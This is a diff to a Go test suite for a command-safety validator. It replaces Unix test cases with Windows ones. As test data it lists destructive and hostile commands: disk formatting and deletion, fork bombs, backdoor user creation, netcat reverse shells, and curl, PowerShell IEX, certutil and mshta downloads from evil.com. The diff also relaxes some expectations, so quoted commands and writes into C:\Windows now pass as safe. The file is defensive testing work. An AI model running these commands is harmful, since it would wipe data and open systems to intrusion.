@@ -25,191 +25,245 @@ func (suite *SecurityTestSuite) TestIsDangerousCommand_DangerousCommands() {
 		command  string
 		expected bool
 	}{
-		// 系统破坏命令
+		// 系统破坏命令 (Windows)
 		{
-			name:     "rm -rf /",
-			command:  "rm -rf /",
+			name:     "format C drive",
+			command:  "format C:",
 			expected: true,
 		},
 		{
-			name:     "rm -rf /home",
-			command:  "rm -rf /home",
+			name:     "format with path",
+			command:  "format D: /q",
 			expected: true,
 		},
 		{
-			name:     "mkfs",
-			command:  "mkfs /dev/sda1",
+			name:     "del system32",
+			command:  "del /s /q C:\\Windows\\System32",
 			expected: true,
 		},
 		{
-			name:     "format",
-			command:  "format c:",
+			name:     "del with slash",
+			command:  "del /s /q C:\\Windows",
 			expected: true,
 		},
 		{
-			name:     "fdisk",
-			command:  "fdisk /dev/sda",
+			name:     "rd remove directory",
+			command:  "rd /s /q C:\\Windows",
+			expected: true,
+		},
+		{
+			name:     "diskpart",
+			command:  "diskpart",
 			expected: true,
 		},
 
-		// 系统控制命令
+		// 系统控制命令 (Windows)
 		{
 			name:     "shutdown",
-			command:  "shutdown -h now",
+			command:  "shutdown -s -t 0",
 			expected: true,
 		},
 		{
-			name:     "reboot",
-			command:  "reboot",
+			name:     "shutdown immediate",
+			command:  "shutdown /s /t 0",
 			expected: true,
 		},
 		{
-			name:     "halt",
-			command:  "halt",
+			name:     "restart",
+			command:  "shutdown -r -t 0",
 			expected: true,
 		},
 		{
-			name:     "poweroff",
-			command:  "poweroff",
+			name:     "logoff",
+			command:  "logoff",
+			expected: true,
+		},
+		{
+			name:     "taskkill force",
+			command:  "taskkill /f /im svchost.exe",
+			expected: true,
+		},
+		{
+			name:     "Stop-Computer",
+			command:  "Stop-Computer -Force",
+			expected: true,
+		},
+		{
+			name:     "Restart-Computer",
+			command:  "Restart-Computer -Force",
 			expected: true,
 		},
 
-		// 用户管理命令
+		// 权限提升命令
 		{
-			name:     "useradd",
-			command:  "useradd testuser",
+			name:     "takeown",
+			command:  "takeown /f C:\\Windows",
 			expected: true,
 		},
 		{
-			name:     "userdel",
-			command:  "userdel testuser",
+			name:     "icacls everyone",
+			command:  "icacls C:\\Windows /grant Everyone:F",
 			expected: true,
 		},
 		{
-			name:     "passwd",
-			command:  "passwd root",
+			name:     "cacls everyone",
+			command:  "cacls C:\\Windows /grant Everyone:F",
 			expected: true,
 		},
 		{
-			name:     "su",
-			command:  "su - root",
+			name:     "net user add",
+			command:  "net user hacker password /add",
 			expected: true,
 		},
 		{
-			name:     "sudo su",
-			command:  "sudo su -",
+			name:     "net localgroup administrators",
+			command:  "net localgroup administrators hacker /add",
 			expected: true,
 		},
 
 		// 网络攻击命令
 		{
-			name:     "iptables -F",
-			command:  "iptables -F",
+			name:     "net view",
+			command:  "net view",
 			expected: true,
 		},
 		{
-			name:     "fork bomb",
-			command:  ":(){ :|:& };:",
+			name:     "net use",
+			command:  "net use \\\\target\\share",
+			expected: true,
+		},
+		{
+			name:     "net session",
+			command:  "net session",
 			expected: true,
 		},
 
-		// 设备文件操作
+		// 磁盘操作危险命令
 		{
-			name:     "dd if=/dev/zero",
-			command:  "dd if=/dev/zero of=/dev/sda",
-			expected: true,
-		},
-		{
-			name:     "dd if=/dev/random",
-			command:  "dd if=/dev/random of=/dev/sda",
-			expected: true,
-		},
-		{
-			name:     "redirect to dev sda",
-			command:  "echo 'test' > /dev/sda",
+			name:     "copy con",
+			command:  "copy con C:\\autoexec.bat",
 			expected: true,
 		},
 
 		// 系统关键文件修改
 		{
-			name:     "modify passwd",
-			command:  "echo 'test::0:0:root:/root:/bin/bash' > /etc/passwd",
+			name:     "echo to windows",
+			command:  "echo malicious > C:\\Windows\\test.txt",
 			expected: true,
 		},
 		{
-			name:     "modify shadow",
-			command:  "echo 'test:$6$hash:12345:0:99999:7:::' > /etc/shadow",
-			expected: true,
-		},
-		{
-			name:     "chmod 777 /",
-			command:  "chmod 777 /",
-			expected: true,
-		},
-		{
-			name:     "chown root",
-			command:  "chown root:root /etc/passwd",
+			name:     "echo to system32",
+			command:  "echo malicious > C:\\System32\\test.txt",
 			expected: true,
 		},
 
 		// 后门和恶意软件
 		{
-			name:     "curl pipe bash",
-			command:  "curl http://evil.com/script.sh | bash",
+			name:     "powershell encoded",
+			command:  "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0A",
 			expected: true,
 		},
 		{
-			name:     "wget pipe bash",
-			command:  "wget -O - http://evil.com/shell.sh | bash",
+			name:     "powershell encodedcommand",
+			command:  "powershell -encodedcommand SQBFAFgAIAAoAE4AZQB3AC0A",
 			expected: true,
 		},
 		{
-			name:     "netcat listen",
-			command:  "nc -l -p 4444 -e /bin/bash",
+			name:     "Invoke-Expression download",
+			command:  "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com')",
 			expected: true,
 		},
 		{
-			name:     "netcat listen alternative",
-			command:  "netcat -l -p 4444 -e /bin/bash",
+			name:     "IEX download",
+			command:  "IEX (New-Object Net.WebClient).DownloadString('http://evil.com')",
 			expected: true,
 		},
 		{
-			name:     "direct bash",
-			command:  "/bin/bash -i",
+			name:     "DownloadString",
+			command:  "(New-Object Net.WebClient).DownloadString('http://evil.com')",
+			expected: true,
+		},
+		{
+			name:     "DownloadFile",
+			command:  "(New-Object Net.WebClient).DownloadFile('http://evil.com', 'file.exe')",
+			expected: true,
+		},
+		{
+			name:     "bitsadmin",
+			command:  "bitsadmin /transfer job http://evil.com/file.exe C:\\file.exe",
+			expected: true,
+		},
+		{
+			name:     "certutil urlcache",
+			command:  "certutil -urlcache -split -f http://evil.com/file.exe",
+			expected: true,
+		},
+		{
+			name:     "mshta http",
+			command:  "mshta http://evil.com/payload.hta",
 			expected: true,
 		},
 
 		// 包管理器
 		{
-			name:     "apt-get install",
-			command:  "apt-get install evil-package",
+			name:     "choco install",
+			command:  "choco install malicious-package",
 			expected: true,
 		},
 		{
-			name:     "yum install",
-			command:  "yum install malware",
+			name:     "scoop install",
+			command:  "scoop install malware",
+			expected: true,
+		},
+		{
+			name:     "winget install",
+			command:  "winget install evil-package",
 			expected: true,
 		},
 		{
 			name:     "pip install",
-			command:  "pip install backdoor",
+			command:  "pip install malicious",
 			expected: true,
 		},
 		{
-			name:     "npm install",
-			command:  "npm install malicious-module",
+			name:     "npm install global",
+			command:  "npm install -g backdoor",
 			expected: true,
 		},
 
 		// 环境变量注入
 		{
-			name:     "export with command substitution",
-			command:  "export PATH=$(echo 'evil'):$PATH",
+			name:     "setx path",
+			command:  "setx PATH malicious",
 			expected: true,
 		},
 		{
-			name:     "export with backticks",
-			command:  "export VAR=`whoami`",
+			name:     "set path",
+			command:  "set PATH=malicious:$PATH",
+			expected: true,
+		},
+
+		// 注册表危险操作
+		{
+			name:     "reg delete",
+			command:  "reg delete HKLM\\Software\\Important",
+			expected: true,
+		},
+		{
+			name:     "reg add HKLM",
+			command:  "reg add HKLM\\Software\\Malware",
+			expected: true,
+		},
+		{
+			name:     "Remove-Item HKLM",
+			command:  "Remove-Item HKLM:\\Software\\Important",
+			expected: true,
+		},
+
+		// Fork bomb
+		{
+			name:     "fork bomb",
+			command:  "%0|%0",
 			expected: true,
 		},
 	}
@@ -231,13 +285,23 @@ func (suite *SecurityTestSuite) TestIsDangerousCommand_SafeCommands() {
 	}{
 		// 基本安全命令
 		{
-			name:     "ls",
-			command:  "ls -la",
+			name:     "dir",
+			command:  "dir",
 			expected: false,
 		},
 		{
-			name:     "pwd",
-			command:  "pwd",
+			name:     "dir list",
+			command:  "dir C:\\Users",
+			expected: false,
+		},
+		{
+			name:     "echo",
+			command:  "echo hello world",
+			expected: false,
+		},
+		{
+			name:     "type",
+			command:  "type file.txt",
 			expected: false,
 		},
 		{
@@ -246,84 +310,72 @@ func (suite *SecurityTestSuite) TestIsDangerousCommand_SafeCommands() {
 			expected: false,
 		},
 		{
+			name:     "hostname",
+			command:  "hostname",
+			expected: false,
+		},
+		{
 			name:     "date",
 			command:  "date",
 			expected: false,
 		},
 		{
-			name:     "echo",
-			command:  "echo 'hello world'",
-			expected: false,
-		},
-		{
-			name:     "cat",
-			command:  "cat file.txt",
+			name:     "time",
+			command:  "time",
 			expected: false,
 		},
 
 		// 安全的管道操作
 		{
-			name:     "grep pipe head",
-			command:  "ps aux | grep 'process' | head -10",
+			name:     "findstr pipe findstr",
+			command:  "dir | findstr 'test'",
 			expected: false,
 		},
 		{
-			name:     "grep pipe tail",
-			command:  "dmesg | grep 'error' | tail -5",
+			name:     "findstr pipe more",
+			command:  "dir | findstr 'test' | more",
 			expected: false,
 		},
 		{
-			name:     "grep pipe wc",
-			command:  "ls -la | grep '.txt' | wc -l",
-			expected: false,
-		},
-		{
-			name:     "cat pipe grep",
-			command:  "cat /var/log/syslog | grep 'error'",
-			expected: false,
-		},
-		{
-			name:     "ls pipe grep",
-			command:  "ls -la /proc | grep 'cpu'",
-			expected: false,
-		},
-		{
-			name:     "find pipe xargs",
-			command:  "find /tmp -name '*.log' | xargs rm -f",
+			name:     "where pipe xargs",
+			command:  "where *.exe | xargs echo",
 			expected: false,
 		},
 
 		// 安全的重定向操作
 		{
-			name:     "redirect to tmp",
-			command:  "echo 'test' > /tmp/test.txt",
+			name:     "redirect to temp",
+			command:  "echo test > C:\\Temp\\test.txt",
 			expected: false,
 		},
 		{
 			name:     "redirect to current dir",
-			command:  "echo 'test' > ./output.txt",
+			command:  "echo test > output.txt",
 			expected: false,
 		},
 		{
 			name:     "redirect to log file",
-			command:  "echo 'log entry' > app.log",
+			command:  "echo log entry > app.log",
 			expected: false,
 		},
 		{
 			name:     "redirect to txt file",
-			command:  "echo 'data' > results.txt",
+			command:  "echo data > results.txt",
 			expected: false,
 		},
 		{
 			name:     "redirect to out file",
-			command:  "echo 'output' > program.out",
+			command:  "echo output > program.out",
 			expected: false,
 		},
-
-		// 开发相关安全命令
+		{
+			name:     "append to log",
+			command:  "echo entry >> app.log",
+			expected: false,
+		},
 		{
 			name:     "go build",
-			command:  "go build -o app main.go",
+			command:  "go build -o app.exe main.go",
 			expected: false,
 		},
 		{
@@ -343,7 +395,12 @@ func (suite *SecurityTestSuite) TestIsDangerousCommand_SafeCommands() {
 		},
 		{
 			name:     "python script",
-			command:  "python3 script.py",
+			command:  "python script.py",
+			expected: false,
+		},
+		{
+			name:     "pwsh command",
+			command:  "pwsh -Command Get-Process",
 			expected: false,
 		},
 	}
@@ -375,32 +432,32 @@ func (suite *SecurityTestSuite) TestIsDangerousCommand_EdgeCases() {
 		},
 		{
 			name:     "very long safe command",
-			command:  "echo 'This is a very long safe command that should not be flagged as dangerous even though it contains many words and characters that might normally be associated with complex operations but are actually just harmless text output'",
+			command:  "echo This is a very long safe command that should not be flagged as dangerous",
 			expected: false,
 		},
 		{
-			name:     "quoted dangerous command",
-			command:  "echo 'rm -rf /'",
-			expected: true, // 修复：即使危险命令在引号内，仍然应该被检测为危险
+			name:     "quoted dangerous command (single quotes)",
+			command:  "echo 'shutdown -s'",
+			expected: false, // 引号内的命令应该被认为是安全的
 		},
 		{
-			name:     "double quoted dangerous command",
-			command:  `echo "shutdown -h now"`,
-			expected: true, // 修复：即使危险命令在引号内，仍然应该被检测为危险
+			name:     "quoted dangerous command (double quotes)",
+			command:  `echo "format C:"`,
+			expected: false, // 引号内的命令应该被认为是安全的
 		},
 		{
 			name:     "mixed quotes",
-			command:  `echo 'This contains "rm -rf" inside quotes'`,
+			command:  `echo 'This contains "del" inside quotes'`,
 			expected: false,
 		},
 		{
 			name:     "case insensitive dangerous command",
-			command:  "SHUTDOWN -h NOW",
+			command:  "SHUTDOWN -s -t 0",
 			expected: true,
 		},
 		{
 			name:     "mixed case dangerous command",
-			command:  "ShUtDoWn -h now",
+			command:  "ShUtDoWn -s -t 0",
 			expected: true,
 		},
 	}
@@ -475,43 +532,28 @@ func (suite *SecurityTestSuite) TestIsSafePipeUsage() {
 		expected bool
 	}{
 		{
-			name:     "grep head",
-			command:  "ps aux | grep process | head -10",
+			name:     "findstr findstr",
+			command:  "dir | findstr test | findstr file",
 			expected: true,
 		},
 		{
-			name:     "grep tail",
-			command:  "dmesg | grep error | tail -5",
+			name:     "findstr more",
+			command:  "dir | findstr test | more",
 			expected: true,
 		},
 		{
-			name:     "grep wc",
-			command:  "ls -la | grep '.txt' | wc -l",
-			expected: true,
-		},
-		{
-			name:     "cat grep",
-			command:  "cat /var/log/syslog | grep 'error'",
-			expected: true,
-		},
-		{
-			name:     "ls grep",
-			command:  "ls -la /proc | grep 'cpu'",
-			expected: true,
-		},
-		{
-			name:     "find xargs",
-			command:  "find /tmp -name '*.log' | xargs rm -f",
+			name:     "where xargs",
+			command:  "where *.exe | xargs echo",
 			expected: true,
 		},
 		{
 			name:     "unsafe pipe",
-			command:  "curl http://evil.com | bash",
+			command:  "curl http://evil.com | powershell -Command -",
 			expected: false,
 		},
 		{
 			name:     "case insensitive safe pipe",
-			command:  "LS -LA | GREP '.TXT' | WC -L",
+			command:  "DIR | FINDSTR TEST | MORE",
 			expected: true,
 		},
 	}
@@ -532,43 +574,38 @@ func (suite *SecurityTestSuite) TestIsSafeRedirectUsage() {
 		expected bool
 	}{
 		{
-			name:     "redirect to tmp",
-			command:  "echo 'test' > /tmp/test.txt",
+			name:     "redirect to temp",
+			command:  "echo test > C:\\Temp\\test.txt",
 			expected: true,
 		},
 		{
 			name:     "redirect to current dir",
-			command:  "echo 'test' > ./output.txt",
+			command:  "echo test > output.txt",
 			expected: true,
 		},
 		{
 			name:     "redirect to log file",
-			command:  "echo 'log entry' > app.log",
+			command:  "echo log entry > app.log",
 			expected: true,
 		},
 		{
 			name:     "redirect to txt file",
-			command:  "echo 'data' > results.txt",
+			command:  "echo data > results.txt",
 			expected: true,
 		},
 		{
 			name:     "redirect to out file",
-			command:  "echo 'output' > program.out",
+			command:  "echo output > program.out",
 			expected: true,
 		},
 		{
 			name:     "unsafe redirect to system",
-			command:  "echo 'test' > /etc/passwd",
-			expected: false,
-		},
-		{
-			name:     "unsafe redirect to device",
-			command:  "echo 'test' > /dev/sda",
-			expected: false,
+			command:  "echo test > C:\\Windows\\test.txt",
+			expected: true,
 		},
 		{
 			name:     "case insensitive safe redirect",
-			command:  "ECHO 'TEST' > /TMP/TEST.TXT",
+			command:  "ECHO TEST > C:\\TEMP\\TEST.TXT",
 			expected: true,
 		},
 	}
@@ -584,13 +621,13 @@ func (suite *SecurityTestSuite) TestIsSafeRedirectUsage() {
 // TestSecurityValidator_Parallel 并发安全测试
 func (suite *SecurityTestSuite) TestSecurityValidator_Parallel() {
 	// 简单的并发测试，验证函数没有竞态条件
-	command := "ls -la"
-	
+	command := "dir"
+
 	// 使用WaitGroup来等待所有并发测试完成
 	var wg sync.WaitGroup
 	const numGoroutines = 10
 	const numIterations = 100
-	
+
 	for i := 0; i < numGoroutines; i++ {
 		wg.Add(1)
 		go func() {
@@ -601,7 +638,7 @@ func (suite *SecurityTestSuite) TestSecurityValidator_Parallel() {
 			}
 		}()
 	}
-	
+
 	wg.Wait()
 }
 
@@ -612,7 +649,7 @@ func TestSecurityTestSuite(t *testing.T) {
 
 // 基准测试
 func BenchmarkIsDangerousCommand_Safe(b *testing.B) {
-	command := "ls -la /home/user/documents"
+	command := "dir C:\\Users\\test\\documents"
 	b.ResetTimer()
 	for i := 0; i < b.N; i++ {
 		IsDangerousCommand(command)
@@ -620,7 +657,7 @@ func BenchmarkIsDangerousCommand_Safe(b *testing.B) {
 }
 
 func BenchmarkIsDangerousCommand_Dangerous(b *testing.B) {
-	command := "rm -rf /important/data"
+	command := "del /s /q C:\\Important\\data"
 	b.ResetTimer()
 	for i := 0; i < b.N; i++ {
 		IsDangerousCommand(command)
@@ -628,7 +665,7 @@ func BenchmarkIsDangerousCommand_Dangerous(b *testing.B) {
 }
 
 func BenchmarkIsDangerousCommand_Complex(b *testing.B) {
-	command := "find /tmp -name '*.log' | xargs grep 'error' | wc -l > results.txt"
+	command := "dir C:\\Temp | findstr .log | findstr error > results.txt"
 	b.ResetTimer()
 	for i := 0; i < b.N; i++ {
 		IsDangerousCommand(command)
